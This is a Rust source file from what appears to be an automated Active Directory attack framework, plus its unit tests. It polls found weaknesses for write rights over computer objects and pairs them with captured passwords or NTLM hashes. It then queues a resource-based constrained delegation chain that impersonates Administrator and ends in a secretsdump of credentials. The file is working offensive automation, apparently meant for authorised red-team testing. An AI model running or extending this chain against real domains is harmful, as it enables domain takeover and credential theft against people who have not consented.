//! auto_rbcd_exploitation -- exploit GenericAll/GenericWrite on computer objects via RBCD.
//!
//! When a controlled user has GenericAll or GenericWrite on a computer object
//! (e.g., stannis → kingslanding$), this automation dispatches the full RBCD
//! chain: addcomputer → rbcd_write → S4U → secretsdump.
//!
//! This is separate from s4u.rs which handles pre-existing delegation vulns.
//! RBCD vulns are typically discovered via BloodHound edges.

use std::sync::Arc;
use std::time::Duration;

use serde_json::json;
use tokio::sync::watch;
use tracing::{debug, info, warn};

use crate::orchestrator::dispatcher::Dispatcher;

/// Dedup key prefix for RBCD attacks.
const DEDUP_RBCD: &str = "rbcd_exploit";

/// Monitors for GenericAll/GenericWrite on computer objects and dispatches RBCD.
/// Interval: 30s.
pub async fn auto_rbcd_exploitation(
    dispatcher: Arc<Dispatcher>,
    mut shutdown: watch::Receiver<bool>,
) {
    let mut interval = tokio::time::interval(Duration::from_secs(30));
    interval.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);

    loop {
        tokio::select! {
            _ = interval.tick() => {},
            _ = shutdown.changed() => break,
        }
        if *shutdown.borrow() {
            break;
        }

        if !dispatcher.is_technique_allowed("rbcd") {
            continue;
        }

        {
            let state = dispatcher.state.read().await;
            if state.has_domain_admin
                && state.all_forests_dominated()
                && !dispatcher.config.strategy.should_continue_after_da()
            {
                continue;
            }
        }

        let work: Vec<RbcdWork> = {
            let state = dispatcher.state.read().await;

            state
                .discovered_vulnerabilities
                .values()
                .filter_map(|vuln| {
                    // Match vulns where a user has write access on a COMPUTER object.
                    // These come from BloodHound edges or ACL analysis.
                    let target_type = vuln.details.get("target_type").and_then(|v| v.as_str());
                    if !is_rbcd_candidate(&vuln.vuln_type, target_type) {
                        return None;
                    }

                    if state.exploited_vulnerabilities.contains(&vuln.vuln_id) {
                        return None;
                    }

                    let dedup_key = format!("{DEDUP_RBCD}:{}", vuln.vuln_id);
                    if state.is_processed(DEDUP_RBCD, &dedup_key) {
                        return None;
                    }

                    // Extract source user (who has write access) and target computer
                    let source_user = vuln
                        .details
                        .get("source")
                        .or_else(|| vuln.details.get("source_user"))
                        .or_else(|| vuln.details.get("attacker"))
                        .or_else(|| vuln.details.get("account_name"))
                        .and_then(|v| v.as_str())
                        .map(|s| s.to_string())?;

                    let target_computer = vuln
                        .details
                        .get("target")
                        .or_else(|| vuln.details.get("target_computer"))
                        .or_else(|| vuln.details.get("victim"))
                        .and_then(|v| v.as_str())
                        .map(|s| s.to_string())?;

                    let domain = vuln
                        .details
                        .get("domain")
                        .and_then(|v| v.as_str())
                        .unwrap_or("")
                        .to_string();

                    // Find credential for the source user
                    let credential = state
                        .credentials
                        .iter()
                        .find(|c| {
                            c.username.to_lowercase() == source_user.to_lowercase()
                                && (domain.is_empty()
                                    || c.domain.to_lowercase() == domain.to_lowercase())
                        })
                        .cloned();

                    let hash = if credential.is_none() {
                        state
                            .hashes
                            .iter()
                            .find(|h| {
                                h.username.to_lowercase() == source_user.to_lowercase()
                                    && h.hash_type.to_uppercase() == "NTLM"
                                    && (domain.is_empty()
                                        || h.domain.to_lowercase() == domain.to_lowercase())
                            })
                            .cloned()
                    } else {
                        None
                    };

                    if credential.is_none() && hash.is_none() {
                        debug!(
                            vuln_id = %vuln.vuln_id,
                            source = %source_user,
                            "RBCD skipped: no cred/hash for source user"
                        );
                        return None;
                    }

                    let dc_ip = state
                        .domain_controllers
                        .get(&domain.to_lowercase())
                        .cloned();

                    // Resolve target computer IP from hosts
                    let target_ip = resolve_computer_ip(
                        &target_computer,
                        state
                            .hosts
                            .iter()
                            .map(|h| (h.hostname.as_str(), h.ip.as_str())),
                    );

                    Some(RbcdWork {
                        vuln_id: vuln.vuln_id.clone(),
                        dedup_key,
                        source_user,
                        target_computer,
                        target_ip,
                        domain,
                        dc_ip,
                        credential,
                        hash,
                    })
                })
                .collect()
        };

        for item in work {
            let mut payload = json!({
                "technique": "rbcd_attack",
                "vuln_type": "rbcd",
                "vuln_id": item.vuln_id,
                "target_computer": item.target_computer,
                "domain": item.domain,
                "impersonate": "Administrator",
            });

            if let Some(ref dc) = item.dc_ip {
                payload["dc_ip"] = json!(dc);
            }
            if let Some(ref tip) = item.target_ip {
                payload["target_ip"] = json!(tip);
            }

            if let Some(ref cred) = item.credential {
                payload["username"] = json!(cred.username);
                payload["password"] = json!(cred.password);
                payload["credential"] = json!({
                    "username": cred.username,
                    "password": cred.password,
                    "domain": cred.domain,
                });
            } else if let Some(ref hash) = item.hash {
                payload["username"] = json!(hash.username);
                payload["hash"] = json!(hash.hash_value);
            }

            let priority = dispatcher.effective_priority("rbcd");
            match dispatcher
                .throttled_submit("exploit", "privesc", payload, priority)
                .await
            {
                Ok(Some(task_id)) => {
                    info!(
                        task_id = %task_id,
                        vuln_id = %item.vuln_id,
                        source = %item.source_user,
                        target = %item.target_computer,
                        "RBCD exploitation dispatched"
                    );
                    dispatcher
                        .state
                        .write()
                        .await
                        .mark_processed(DEDUP_RBCD, item.dedup_key.clone());
                    let _ = dispatcher
                        .state
                        .persist_dedup(&dispatcher.queue, DEDUP_RBCD, &item.dedup_key)
                        .await;
                }
                Ok(None) => {}
                Err(e) => {
                    warn!(err = %e, vuln_id = %item.vuln_id, "Failed to dispatch RBCD exploit")
                }
            }
        }
    }
}

struct RbcdWork {
    vuln_id: String,
    dedup_key: String,
    source_user: String,
    target_computer: String,
    target_ip: Option<String>,
    domain: String,
    dc_ip: Option<String>,
    credential: Option<ares_core::models::Credential>,
    hash: Option<ares_core::models::Hash>,
}

/// Returns `true` if a vulnerability type and optional target_type represent an
/// RBCD attack candidate (computer object with GenericAll/GenericWrite).
pub(crate) fn is_rbcd_candidate(vuln_type: &str, target_type: Option<&str>) -> bool {
    let vtype = vuln_type.to_lowercase();
    vtype == "rbcd"
        || vtype == "genericall_computer"
        || vtype == "genericwrite_computer"
        || (matches!(vtype.as_str(), "genericall" | "genericwrite")
            && target_type
                .is_some_and(|t| t.to_lowercase() == "computer" || t.to_lowercase().ends_with('$')))
}

/// Resolve a target computer hostname to an IP from a list of known hosts.
/// Strips trailing `$` from machine account names before matching.
pub(crate) fn resolve_computer_ip<'a>(
    target_computer: &str,
    hosts: impl Iterator<Item = (&'a str, &'a str)>,
) -> Option<String> {
    let tc = target_computer
        .to_lowercase()
        .trim_end_matches('$')
        .to_string();
    for (hostname, ip) in hosts {
        let h_lower = hostname.to_lowercase();
        if h_lower == tc || h_lower.starts_with(&format!("{tc}.")) {
            return Some(ip.to_string());
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_is_rbcd_candidate_direct_types() {
        assert!(is_rbcd_candidate("rbcd", None));
        assert!(is_rbcd_candidate("RBCD", None));
        assert!(is_rbcd_candidate("genericall_computer", None));
        assert!(is_rbcd_candidate("GenericWrite_Computer", None));
    }

    #[test]
    fn test_is_rbcd_candidate_with_target_type() {
        assert!(is_rbcd_candidate("genericall", Some("Computer")));
        assert!(is_rbcd_candidate("genericwrite", Some("DC01$")));
        assert!(is_rbcd_candidate("GenericAll", Some("computer")));
    }

    #[test]
    fn test_is_rbcd_candidate_negative() {
        assert!(!is_rbcd_candidate("genericall", None));
        assert!(!is_rbcd_candidate("genericall", Some("User")));
        assert!(!is_rbcd_candidate("genericwrite", Some("Group")));
        assert!(!is_rbcd_candidate("esc1", None));
        assert!(!is_rbcd_candidate("shadow_credentials", Some("Computer")));
    }

    #[test]
    fn test_resolve_computer_ip_exact_match() {
        let hosts = vec![
            ("dc01", "192.168.58.10"),
            ("sql01.contoso.local", "192.168.58.20"),
        ];
        let result = resolve_computer_ip("DC01$", hosts.into_iter());
        assert_eq!(result, Some("192.168.58.10".to_string()));
    }

    #[test]
    fn test_resolve_computer_ip_fqdn_match() {
        let hosts = vec![
            ("dc01.contoso.local", "192.168.58.10"),
            ("sql01.contoso.local", "192.168.58.20"),
        ];
        let result = resolve_computer_ip("dc01$", hosts.into_iter());
        assert_eq!(result, Some("192.168.58.10".to_string()));
    }

    #[test]
    fn test_resolve_computer_ip_no_match() {
        let hosts = vec![("dc01.contoso.local", "192.168.58.10")];
        let result = resolve_computer_ip("dc02$", hosts.into_iter());
        assert!(result.is_none());
    }

    #[test]
    fn test_resolve_computer_ip_no_dollar_suffix() {
        let hosts = vec![("web01.contoso.local", "192.168.58.30")];
        let result = resolve_computer_ip("web01", hosts.into_iter());
        assert_eq!(result, Some("192.168.58.30".to_string()));
    }

    #[test]
    fn test_resolve_computer_ip_partial_no_match() {
        // "dc01" should not match "dc011.contoso.local"
        let hosts = vec![("dc011.contoso.local", "192.168.58.11")];
        let result = resolve_computer_ip("dc01$", hosts.into_iter());
        assert!(result.is_none());
    }

    #[test]
    fn test_dedup_key_format() {
        let vuln_id = "vuln-123";
        let dedup_key = format!("{DEDUP_RBCD}:{vuln_id}");
        assert_eq!(dedup_key, "rbcd_exploit:vuln-123");
    }

    #[test]
    fn test_dedup_key_constant() {
        assert_eq!(DEDUP_RBCD, "rbcd_exploit");
    }

    #[test]
    fn test_dedup_key_with_uuid_vuln_id() {
        let vuln_id = "550e8400-e29b-41d4-a716-446655440000";
        let dedup_key = format!("{DEDUP_RBCD}:{vuln_id}");
        assert_eq!(
            dedup_key,
            "rbcd_exploit:550e8400-e29b-41d4-a716-446655440000"
        );
    }

    #[test]
    fn test_resolve_computer_ip_empty_hostname() {
        // Hosts with empty hostname should not match anything
        let hosts = vec![("", "192.168.58.10")];
        let result = resolve_computer_ip("dc01$", hosts.into_iter());
        assert!(result.is_none());
    }

    #[test]
    fn test_resolve_computer_ip_empty_target() {
        // Empty target should not match any host
        let hosts = vec![("dc01.contoso.local", "192.168.58.10")];
        let result = resolve_computer_ip("", hosts.into_iter());
        assert!(result.is_none());
    }

    #[test]
    fn test_resolve_computer_ip_dollar_only_target() {
        // A target of just "$" should trim to empty and not match
        let hosts = vec![("dc01.contoso.local", "192.168.58.10")];
        let result = resolve_computer_ip("$", hosts.into_iter());
        assert!(result.is_none());
    }

    #[test]
    fn test_resolve_computer_ip_case_insensitive() {
        let hosts = vec![("DC01.CONTOSO.LOCAL", "192.168.58.10")];
        let result = resolve_computer_ip("dc01", hosts.into_iter());
        assert_eq!(result, Some("192.168.58.10".to_string()));
    }

    #[test]
    fn test_resolve_computer_ip_multiple_hosts_first_match() {
        // When multiple hosts could match, returns the first one
        let hosts = vec![
            ("dc01.contoso.local", "192.168.58.10"),
            ("dc01.fabrikam.local", "192.168.58.20"),
        ];
        let result = resolve_computer_ip("dc01", hosts.into_iter());
        assert_eq!(result, Some("192.168.58.10".to_string()));
    }

    #[test]
    fn test_resolve_computer_ip_empty_hosts_list() {
        let hosts: Vec<(&str, &str)> = vec![];
        let result = resolve_computer_ip("dc01$", hosts.into_iter());
        assert!(result.is_none());
    }

    #[test]
    fn test_resolve_computer_ip_machine_account_with_dollar() {
        // Verify $ is stripped from machine account names
        let hosts = vec![("sql01.contoso.local", "192.168.58.20")];
        let result = resolve_computer_ip("SQL01$", hosts.into_iter());
        assert_eq!(result, Some("192.168.58.20".to_string()));
    }

    #[test]
    fn test_resolve_computer_ip_fqdn_target_no_match() {
        // FQDN target should not match since we only compare short name
        // "dc01.contoso.local" trimmed of $ is "dc01.contoso.local"
        // which does not equal "dc01" and "dc01" does not start with "dc01.contoso.local."
        let hosts = vec![("dc01", "192.168.58.10")];
        let result = resolve_computer_ip("dc01.contoso.local$", hosts.into_iter());
        // tc = "dc01.contoso.local", host "dc01" != "dc01.contoso.local"
        // and "dc01" does not start with "dc01.contoso.local."
        assert!(result.is_none());
    }

    #[test]
    fn test_is_rbcd_candidate_all_vuln_type_strings() {
        // Exhaustive test of all recognized RBCD vuln_type values
        assert!(is_rbcd_candidate("rbcd", None));
        assert!(is_rbcd_candidate("RBCD", None));
        assert!(is_rbcd_candidate("Rbcd", None));
        assert!(is_rbcd_candidate("genericall_computer", None));
        assert!(is_rbcd_candidate("GenericAll_Computer", None));
        assert!(is_rbcd_candidate("GENERICALL_COMPUTER", None));
        assert!(is_rbcd_candidate("genericwrite_computer", None));
        assert!(is_rbcd_candidate("GenericWrite_Computer", None));
        assert!(is_rbcd_candidate("GENERICWRITE_COMPUTER", None));
    }

    #[test]
    fn test_is_rbcd_candidate_generic_with_computer_target() {
        // genericall/genericwrite require target_type=Computer to be RBCD candidates
        assert!(is_rbcd_candidate("genericall", Some("Computer")));
        assert!(is_rbcd_candidate("genericall", Some("computer")));
        assert!(is_rbcd_candidate("genericall", Some("COMPUTER")));
        assert!(is_rbcd_candidate("genericwrite", Some("Computer")));
        assert!(is_rbcd_candidate("genericwrite", Some("computer")));
    }

    #[test]
    fn test_is_rbcd_candidate_generic_with_machine_account_target() {
        // Machine accounts ending with $ are treated as computer targets
        assert!(is_rbcd_candidate("genericall", Some("DC01$")));
        assert!(is_rbcd_candidate("genericwrite", Some("SQL01$")));
        assert!(is_rbcd_candidate("genericall", Some("web01$")));
    }

    #[test]
    fn test_is_rbcd_candidate_generic_without_target_type_rejected() {
        // genericall/genericwrite without target_type should NOT be RBCD
        assert!(!is_rbcd_candidate("genericall", None));
        assert!(!is_rbcd_candidate("genericwrite", None));
    }

    #[test]
    fn test_is_rbcd_candidate_generic_with_non_computer_target() {
        // genericall/genericwrite on non-computer targets
        assert!(!is_rbcd_candidate("genericall", Some("User")));
        assert!(!is_rbcd_candidate("genericall", Some("Group")));
        assert!(!is_rbcd_candidate("genericwrite", Some("OU")));
        assert!(!is_rbcd_candidate("genericwrite", Some("GPO")));
        assert!(!is_rbcd_candidate("genericall", Some("")));
    }

    #[test]
    fn test_is_rbcd_candidate_unrelated_vuln_types() {
        // Non-RBCD vuln types should all return false regardless of target_type
        let non_rbcd = vec![
            "esc1",
            "esc4",
            "esc8",
            "shadow_credentials",
            "constrained_delegation",
            "unconstrained_delegation",
            "gpo_abuse",
            "gpo_write",
            "dcsync",
            "mssql_impersonation",
            "writedacl",
            "writeowner",
            "",
        ];
        for vtype in non_rbcd {
            assert!(
                !is_rbcd_candidate(vtype, None),
                "{vtype:?} should not be RBCD candidate with no target"
            );
            assert!(
                !is_rbcd_candidate(vtype, Some("Computer")),
                "{vtype:?} should not be RBCD candidate even with Computer target"
            );
        }
    }
}
